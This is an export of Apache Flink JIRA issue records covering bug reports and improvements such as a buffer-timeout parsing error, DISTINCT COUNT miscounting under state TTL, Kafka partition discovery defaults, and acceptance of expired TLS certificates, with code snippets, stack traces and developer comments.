<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,xueyongyang,xueyongyang,08/May/23 02:40,08/May/23 02:44,04/Jun/24 20:41,,jdbc-3.1.0,,,,,,,,,,,,,,,,,,,,Connectors / JDBC,,,,0,,,,"I have a sql,


insert into test_flink_res2(id,name,address) 
select a.id,a.name,a.address from test_flink_res1 a left join test_flink_res2 b on a.id=b.id where a.name='abc0.11317691217472489' and b.id is null;

*Why does flinksql convert this statement into the following statement？*

SELECT `address` FROM `test_flink_res1` WHERE ((`name` = 'abc0.11317691217472489')) AND ((`id` IS NULL))

*As a result, there is no data in test_flink_res2，why？*","flink1.16.1

mysql8.0.33

jdbc-3.1.0-1.16 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-08 02:40:44.0,,,,,,,,,,"0|z1hqvs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make job cancellation button on UI configurable,FLINK-32025,13535309,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,yuzhihong@gmail.com,yuzhihong@gmail.com,07/May/23 16:01,08/May/23 00:51,04/Jun/24 20:41,08/May/23 00:51,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,"On the flink job UI, there is `Cancel Job` button.

When the job UI is shown to users, it is desirable to hide the button so that normal user doesn't mistakenly cancel a long running flink job.

This issue adds configuration for hiding the `Cancel Job` button.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 08 00:43:13 UTC 2023,,,,,,,,,,"0|z1hqtk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/May/23 00:43;Echo Lee;It is already possible to hide the 'cancel job' button by setting *web.cancel.enable=false*;;;",,,,,,,,,,,,,,,,,,,,,,
Short code related to externalized connector retrieve version from its own data yaml,FLINK-32024,13535295,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Weijie Guo,Weijie Guo,Weijie Guo,07/May/23 06:42,03/Nov/23 09:05,04/Jun/24 20:41,15/May/23 13:25,1.16.1,1.17.0,1.18.0,,,,,,,,,,,,1.16.2,1.17.1,1.18.0,jdbc-3.1.1,opensearch-1.0.2,opensearch-1.1.0,Connectors / Common,,,,0,pull-request-available,,,"Currently, we have some shortcodes specifically designed for externalized connector, such as {{connectors_artifact}}, {{sql_connector_download_table}}, etc.

When using them, we need to pass in a version number, such as {{sql_connector_download_table ""pulsar"" 3.0.0}}.  It's easy for us to forget to modify the corresponding version in the document when releasing a new version.

Of course, we can hard code these into the release process. But perhaps we can introduce a version field to {{docs/data/connector_name.yml}} and let flink directly reads the corresponding version when rendering shortcode.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 15 13:25:21 UTC 2023,,,,,,,,,,"0|z1hqqg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/May/23 13:25;Weijie Guo;master(1.18) via 4dc2a98ed436a0197cce1bdcc97f808cfdb2240c.
release-1.17 via f1308eabd9da12878a51cad8ecdfdf20c1a52cac.
release-1.16 via 1a3b539fa43b4e1c8f07accf2d4aa352b7f63858.;;;",,,,,,,,,,,,,,,,,,,,,,
execution.buffer-timeout cannot be set to -1 ms,FLINK-32023,13535251,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Jiangang,Jiangang,Jiangang,06/May/23 07:13,06/Jun/23 02:20,04/Jun/24 20:41,06/Jun/23 02:20,1.16.1,1.17.0,1.18.0,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,API / DataStream,,,,0,pull-request-available,,,"The desc for execution.buffer-timeout is as following:
{code:java}
public static final ConfigOption<Duration> BUFFER_TIMEOUT =
        ConfigOptions.key(""execution.buffer-timeout"")
                .durationType()
                .defaultValue(Duration.ofMillis(100))
                .withDescription(
                        Description.builder()
                                .text(
                                        ""The maximum time frequency (milliseconds) for the flushing of the output buffers. By default ""
                                                + ""the output buffers flush frequently to provide low latency and to aid smooth developer ""
                                                + ""experience. Setting the parameter can result in three logical modes:"")
                                .list(
                                        text(
                                                ""A positive value triggers flushing periodically by that interval""),
                                        text(
                                                FLUSH_AFTER_EVERY_RECORD
                                                        + "" triggers flushing after every record thus minimizing latency""),
                                        text(
                                                DISABLED_NETWORK_BUFFER_TIMEOUT
                                                        + "" ms triggers flushing only when the output buffer is full thus maximizing ""
                                                        + ""throughput""))
                                .build()); {code}
When we set execution.buffer-timeout to -1 ms, the following error is reported:
{code:java}
Caused by: java.lang.IllegalArgumentException: Could not parse value '-1 ms' for key 'execution.buffer-timeout'.
    at org.apache.flink.configuration.Configuration.getOptional(Configuration.java:856)
    at org.apache.flink.streaming.api.environment.StreamExecutionEnvironment.configure(StreamExecutionEnvironment.java:822)
    at org.apache.flink.streaming.api.environment.StreamExecutionEnvironment.<init>(StreamExecutionEnvironment.java:224)
    at org.apache.flink.streaming.api.environment.StreamContextEnvironment.<init>(StreamContextEnvironment.java:51)
    at org.apache.flink.streaming.api.environment.StreamExecutionEnvironment.createStreamExecutionEnvironment(StreamExecutionEnvironment.java:1996)
    at java.util.Optional.orElseGet(Optional.java:267)
    at org.apache.flink.streaming.api.environment.StreamExecutionEnvironment.getExecutionEnvironment(StreamExecutionEnvironment.java:1986)
    at com.kuaishou.flink.examples.api.WordCount.main(WordCount.java:27)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:498)
    at org.apache.flink.client.program.PackagedProgram.callMainMethod(PackagedProgram.java:327)
    ... 11 more
Caused by: java.lang.NumberFormatException: text does not start with a number
    at org.apache.flink.util.TimeUtils.parseDuration(TimeUtils.java:78)
    at org.apache.flink.configuration.Configuration.convertToDuration(Configuration.java:1058)
    at org.apache.flink.configuration.Configuration.convertValue(Configuration.java:996)
    at org.apache.flink.configuration.Configuration.lambda$getOptional$2(Configuration.java:853)
    at java.util.Optional.map(Optional.java:215)
    at org.apache.flink.configuration.Configuration.getOptional(Configuration.java:853)
    ... 23 more {code}
The reason is that the value for Duration can not be negative. We should change the behavior or support to trigger flushing only when the output buffer is full.",,,,,,,,,,,,,,,,,,,,,FLINK-14787,,FLINK-32250,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 31 10:16:06 UTC 2023,,,,,,,,,,"0|z1hqgo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/May/23 02:39;wanglijie;[~Jiangang] Thanks for reporting this. Would you like to prepare a fix ?  I think we should make the {{TimeUtils#parseDuration}} support parsing negative duration.;;;","08/May/23 02:46;fanrui;Hi [~Jiangang] , thanks for your report. It's really a bug. Would you like to fix it?

From the perspective of Duration, that the value for Duration can not be negative is reasonable. So I prefer choose a special time as the flag of the disable buffer timeout mechanism. WDYT?

cc [~dwysakowicz] , maybe you are also interested in this bug. :);;;","08/May/23 02:56;fanrui;Thanks [~wanglijie] 's feedback.

Sorry, after my double check, I see the `java.time.Duration` supports negative value, and it isn't supported in flink side. So it's reasonable making the {{TimeUtils#parseDuration}} support parsing negative duration.

 ;;;","08/May/23 06:20;Jiangang;[~wanglijie] [~fanrui] Thanks for the reply. I would to fix it.;;;","08/May/23 06:22;fanrui;Thanks [~Jiangang] , I have assigned this JIRA to you.:);;;","29/May/23 06:08;fanrui;<master:1.18> 522ff833ad7e3b3c80f4c1ba326cb05fdc4d6a3c

<1.17> 67acbe9c8814dd56262053d443ae2712e03d1cb0

<1.16> 71482596056feaca04389496373fde006ca26803;;;","31/May/23 10:16;fanrui;This Jira isn't closed due to waiting for backport it to 1.16 and 1.17.;;;",,,,,,,,,,,,,,,,
Source level scaling is not applied to operators with chaining applied,FLINK-32022,13535246,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,tanee.kim,tanee.kim,06/May/23 04:08,06/May/23 07:14,04/Jun/24 20:41,06/May/23 07:14,,,,,,,,,,,,,,,,,,,,,Autoscaler,,,,0,,,,"The scaling algorithm is applied on a per-vertex basis, and if the source and downstream operators are chained together, source scaling is not applied.
Is this intended?",,,,,,,,,,,,,,,,,,,,FLINK-31996,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-06 04:08:38.0,,,,,,,,,,"0|z1hqfk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improvement the Javadoc for SpecifiedOffsetsInitializer and TimestampOffsetsInitializer.,FLINK-32021,13535243,13534275,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,loserwang1024,loserwang1024,loserwang1024,06/May/23 03:18,26/Jan/24 08:33,04/Jun/24 20:41,11/Jul/23 02:25,kafka-3.0.0,,,,,,,,,,,,,,kafka-3.1.0,,,,,,Connectors / Kafka,,,,0,pull-request-available,,,"As described in [FLIP-288|https://cwiki.apache.org/confluence/display/FLINK/FLIP-288%3A+Enable+Dynamic+Partition+Discovery+by+Default+in+Kafka+Source], Current JavaDoc does not fully explain the behavior of OffsetsInitializers. When the partition does not meet the condition, there will be a different offset strategy. This may lead to misunderstandings in the design and usage.

 

Add to SpecifiedOffsetsInitializer: ""Use Specified offset for specified partitions while use commit offset or Earliest for unspecified partitions. Specified partition offset should be less than the latest offset, otherwise it will start from the earliest.""

 

Add to TimestampOffsetsInitializer:Initialize the offsets based on a timestamp. If the message meeting the requirement of the timestamp have not been produced to Kafka yet, just use the latest offset.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 11 02:25:24 UTC 2023,,,,,,,,,,"0|z1hqew:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"11/Jul/23 02:25;leonard;Resolved in flink-connector-kafka(main): 14d8462be33c25031e94da0635105f69bb807641;;;",,,,,,,,,,,,,,,,,,,,,,
Enable Dynamic Partition Discovery by Default in Kafka Source based on FLIP-288,FLINK-32020,13535240,13534275,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,loserwang1024,loserwang1024,loserwang1024,06/May/23 02:52,26/Jan/24 08:33,04/Jun/24 20:41,14/Jul/23 06:39,kafka-3.0.0,,,,,,,,,,,,,,kafka-3.1.0,,,,,,Connectors / Kafka,,,,0,pull-request-available,,,"As described in [FLIP-288|https://cwiki.apache.org/confluence/display/FLINK/FLIP-288%3A+Enable+Dynamic+Partition+Discovery+by+Default+in+Kafka+Source], dynamic partition discovery is disabled by default, and users have to specify the interval of discovery in order to turn it on.

This subtask is to enable Dynamic Partition Discovery by Default in Kafka Source.

Partition discovery is performed on the KafkaSourceEnumerator, which asynchronously fetches topic metadata from the Kafka cluster and checks if there are any new topics and partitions. This should not cause performance issues on the Flink side.

On the Kafka broker side, partition discovery sends a MetadataRequest to the Kafka broker to fetch topic information. Considering that the Kafka broker has its metadata cache and the default request frequency is relatively low (once every 30 seconds), this is not a heavy operation, and the broker's performance will not be significantly affected.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 14 06:39:06 UTC 2023,,,,,,,,,,"0|z1hqe8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jul/23 06:39;renqs;Merged to main: 811716c5155e82fa3bfc47ced53daef53bb99cce;;;",,,,,,,,,,,,,,,,,,,,,,
EARLIEST offset strategy for partitions discoveried later based on FLIP-288,FLINK-32019,13535239,13534275,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,loserwang1024,loserwang1024,loserwang1024,06/May/23 02:50,26/Jan/24 08:33,04/Jun/24 20:41,07/Jul/23 02:21,kafka-3.0.0,,,,,,,,,,,,,,kafka-3.1.0,,,,,,Connectors / Kafka,,,,0,pull-request-available,,,"As described in [FLIP-288|https://cwiki.apache.org/confluence/display/FLINK/FLIP-288%3A+Enable+Dynamic+Partition+Discovery+by+Default+in+Kafka+Source], the strategy used for new partitions is the same as the initial offset strategy, which is not reasonable.

According to the semantics, if the startup strategy is latest, the consumed data should include all data from the moment of startup, which also includes all messages from new created partitions. However, the latest strategy currently maybe used for new partitions, leading to the loss of some data (thinking a new partition is created and might be discovered by Kafka source several minutes later, and the message produced into the partition within the gap might be dropped if we use for example ""latest"" as the initial offset strategy).if the data from all new partitions is not read, it does not meet the user's expectations.

Other ploblems see final Section of [FLIP-288|https://cwiki.apache.org/confluence/display/FLINK/FLIP-288%3A+Enable+Dynamic+Partition+Discovery+by+Default+in+Kafka+Source]: {{User specifies OffsetsInitializer for new partition}} .

Therefore, it’s better to provide an *EARLIEST* strategy for later discovered partitions.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 07 02:20:16 UTC 2023,,,,,,,,,,"0|z1hqe0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"07/Jul/23 02:20;renqs;Merged to flink-connector-kafka/main: ad62c133ee32241d9b897543b86a1cc9fe64414b;;;",,,,,,,,,,,,,,,,,,,,,,
Many builds of benchmark have been interrupted since 20230428,FLINK-32018,13535235,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,Yanfei Lei,Yanfei Lei,Yanfei Lei,06/May/23 02:13,16/May/23 08:40,04/Jun/24 20:41,16/May/23 08:40,1.18.0,,,,,,,,,,,,,,,,,,,,Benchmarks,,,,0,pull-request-available,,,"Since 2023.04.28, flink-statebackend-benchmarks-java8, flink-statebackend-benchmarks-java11, flink-master-benchmarks-java8 and  flink-master-benchmarks-java11 all failed.

 

[http://codespeed.dak8s.net:8080/job/flink-statebackend-benchmarks-java8/]

[http://codespeed.dak8s.net:8080/job/flink-statebackend-benchmarks-java11/]

[http://codespeed.dak8s.net:8080/job/flink-master-benchmarks-java8/] 

[http://codespeed.dak8s.net:8080/job/flink-master-benchmarks-java11/] ",,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-31925,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat May 06 05:33:14 UTC 2023,,,,,,,,,,"0|z1hqd4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/May/23 05:33;Yanfei Lei;I suspect it has something to do with the version of JMH, before FLINK-31925 , the benchmark can run normally. [http://codespeed.dak8s.net:8080/job/flink-benchmark-request/219/]

[~MartijnVisser] could you help take a look?;;;",,,,,,,,,,,,,,,,,,,,,,
DISTINCT COUNT result is incorrect with ttl,FLINK-32017,13535231,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,Bo Cui,Bo Cui,06/May/23 01:35,06/May/23 01:35,04/Jun/24 20:41,,1.12.0,1.15.0,1.17.0,1.18.0,,,,,,,,,,,,,,,,,,,,,0,,,,"SQL: SELECT COUNT(DISTINCT `c`) FROM Table1
and set ttl to 10s

and Flink will generate code:
{code:java}
public final class GroupAggsHandler$15 implements org.apache.flink.table.runtime.generated.AggsHandleFunction {

          long agg0_count;
          boolean agg0_countIsNull;
          private transient org.apache.flink.table.runtime.typeutils.ExternalSerializer externalSerializer$0;
          private transient org.apache.flink.table.runtime.typeutils.ExternalSerializer externalSerializer$1;
          private org.apache.flink.table.runtime.dataview.StateMapView distinctAcc_0_dataview;
          private org.apache.flink.table.data.binary.BinaryRawValueData distinctAcc_0_dataview_raw_value;
          private org.apache.flink.table.api.dataview.MapView distinct_view_0;
          org.apache.flink.table.data.GenericRowData acc$3 = new org.apache.flink.table.data.GenericRowData(2);
          org.apache.flink.table.data.GenericRowData acc$5 = new org.apache.flink.table.data.GenericRowData(2);
          org.apache.flink.table.data.GenericRowData aggValue$14 = new org.apache.flink.table.data.GenericRowData(1);

          private org.apache.flink.table.runtime.dataview.StateDataViewStore store;

          public GroupAggsHandler$15(java.lang.Object[] references) throws Exception {
            externalSerializer$0 = (((org.apache.flink.table.runtime.typeutils.ExternalSerializer) references[0]));
            externalSerializer$1 = (((org.apache.flink.table.runtime.typeutils.ExternalSerializer) references[1]));
          }

          private org.apache.flink.api.common.functions.RuntimeContext getRuntimeContext() {
            return store.getRuntimeContext();
          }

          @Override
          public void open(org.apache.flink.table.runtime.dataview.StateDataViewStore store) throws Exception {
            this.store = store;
            
            distinctAcc_0_dataview = (org.apache.flink.table.runtime.dataview.StateMapView) store.getStateMapView(""distinctAcc_0"", true, externalSerializer$0, externalSerializer$1);
            distinctAcc_0_dataview_raw_value = org.apache.flink.table.data.binary.BinaryRawValueData.fromObject(distinctAcc_0_dataview);
            distinct_view_0 = distinctAcc_0_dataview;
          }

          @Override
          public void accumulate(org.apache.flink.table.data.RowData accInput) throws Exception {
            
            int field$7;
            boolean isNull$7;
            boolean isNull$9;
            long result$10;
            isNull$7 = accInput.isNullAt(0);
            field$7 = -1;
            if (!isNull$7) {
              field$7 = accInput.getInt(0);
            }
            java.lang.Integer distinctKey$8 = (java.lang.Integer) field$7;
            if (isNull$7) {
              distinctKey$8 = null;
            }
                     
            java.lang.Long value$12 = (java.lang.Long) distinct_view_0.get(distinctKey$8);
            if (value$12 == null) {
              value$12 = 0L;
            }
                   
            boolean is_distinct_value_changed_0 = false;
            
            long existed$13 = ((long) value$12) & (1L << 0);
            if (existed$13 == 0) {  // not existed
              value$12 = ((long) value$12) | (1L << 0);
              is_distinct_value_changed_0 = true;
              
            long result$11 = -1L;
            boolean isNull$11;
            if (isNull$7) {
              
             // --- Cast section generated by org.apache.flink.table.planner.functions.casting.IdentityCastRule
             
             // --- End cast section
                           
              isNull$11 = agg0_countIsNull;
              if (!isNull$11) {
                result$11 = agg0_count;
              }
            }
            else {
              
            
            
            isNull$9 = agg0_countIsNull || false;
            result$10 = -1L;
            if (!isNull$9) {
              
            
            result$10 = (long) (agg0_count + ((long) 1L));
            
              
            }
            
             // --- Cast section generated by org.apache.flink.table.planner.functions.casting.IdentityCastRule
             
             // --- End cast section
                           
              isNull$11 = isNull$9;
              if (!isNull$11) {
                result$11 = result$10;
              }
            }
            agg0_count = result$11;;
            agg0_countIsNull = isNull$11;
                   
            }
                       
            if (is_distinct_value_changed_0) {
              distinct_view_0.put(distinctKey$8, value$12);
            }
                   
            
          }

          @Override
          public void setAccumulators(org.apache.flink.table.data.RowData acc) throws Exception {
            
            long field$6;
            boolean isNull$6;
            isNull$6 = acc.isNullAt(0);
            field$6 = -1L;
            if (!isNull$6) {
              field$6 = acc.getLong(0);
            }
            
            distinct_view_0 = distinctAcc_0_dataview;
            
            
            agg0_count = field$6;;
            agg0_countIsNull = isNull$6;
                     
            
                
          }
        }
{code}
and distinctAcc_0_dataview and GroupAggFunctionttl#accState are the 10s, GroupAggFunctionttl#accState save `Count`, distinctAcc_0_dataview save `distinct`.

Reproduction:
1) input 1 record, distinctAcc_0_dataview is updated to 1 and accState is updated to 1
2) after 5 s, input same record , distinctAcc_0_dataview remains unchanged and accState is updated to 1
3) after 11 s, distinctAcc_0_dataview expiration
4) after 12 s, input same record , distinctAcc_0_dataview is updated to 1 and accState is updated to 2",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-06 01:35:58.0,,,,,,,,,,"0|z1hqc8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Logs are printed as disabled even if the autoscaler option is true,FLINK-32016,13535229,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,tanee.kim,tanee.kim,06/May/23 01:25,06/May/23 08:42,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Autoscaler,,,,0,,,,"The part where the job.autoscaler.enabled option is logged as disabled due to the code below, even if it is set to true, is misleading to users and needs to be corrected in the log message.
{code:java}
if (resource.getSpec().getJob() == null || !conf.getBoolean(AUTOSCALER_ENABLED)) {
    LOG.info(""Job autoscaler is disabled"");
    return false;
} {code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat May 06 08:42:33 UTC 2023,,,,,,,,,,"0|z1hqbs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/May/23 07:37;gyfora;This looks correct, autoscaler is disabled on session clusters. We don’t log the option we log that the autoscaler is not going to do anything here:);;;","06/May/23 08:21;tanee.kim;The above log is being printed periodically, even though I am not using a session cluster and the AUTOSCALER_ENABLED option is turned on.

There seems to be a point in time when FlinkResourceReconciler does not recognize the AUTOSCALER_ENABLED option properly when reconciliation is performed and it is logged.;;;","06/May/23 08:34;gyfora;That sounds strange can you share you yaml config?;;;","06/May/23 08:42;tanee.kim;When I went to forward the yaml config you requested, I realized that the logs were from an app that exists in a different namespace for testing, and I was confused by looking at one flink-operator log.
As you said, the above logs are printed normally.;;;",,,,,,,,,,,,,,,,,,,
Flink does not fail SSL Handshake when expired cert is used,FLINK-32015,13535222,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,dhrapate,dhrapate,05/May/23 22:50,05/May/23 22:52,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Runtime / Network,,,,0,,,,"We recently observed that Flink is able to perform SSL communication without any issues even if certs in the trust store are expired

As per this issue in Netty library, it says that Default TrustManagerFactory does not come with that check in place and we need to implement our own TrustManagerFactory for the desired behavior
[https://github.com/netty/netty/issues/8461]

It would be good to perform the cert validity check to prevent the risk of using expired certs",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-05 22:50:15.0,,,,,,,,,,"0|z1hqa8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cassandra source documentation is missing and javadoc is out of sync,FLINK-32014,13535181,,Technical Debt,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,echauchot,echauchot,echauchot,05/May/23 14:12,19/Apr/24 09:25,04/Jun/24 20:41,11/May/23 15:46,,,,,,,,,,,,,,,1.18.0,cassandra-3.2.0,,,,,Connectors / Cassandra,Documentation,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-05 14:12:56.0,,,,,,,,,,"0|z1hq14:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
